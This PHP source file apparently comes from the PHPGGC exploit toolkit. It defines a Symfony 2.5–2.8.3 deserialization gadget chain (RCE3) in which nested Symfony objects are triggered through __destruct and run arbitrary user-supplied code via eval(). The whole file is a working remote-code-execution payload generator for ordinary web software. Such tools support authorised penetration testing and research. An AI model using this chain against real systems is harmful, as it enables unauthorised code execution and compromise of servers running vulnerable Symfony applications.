<?php

namespace GadgetChain\Symfony;

class RCE3 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '2.5 > 2.8.3';
    public $vector = '__destruct';
    public $author = 'crlf';
    public $informations = 'Executes through eval() ( <?php \'.$code.\';die(); ?> )';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \Symfony\Component\Process\Pipes\WindowsPipes(
               new \Symfony\Component\Finder\Expression\Expression(
               new \Symfony\Component\Templating\PhpEngine(
               new \Symfony\Component\Templating\Storage\StringStorage(
               $code
               ))));
    }
}
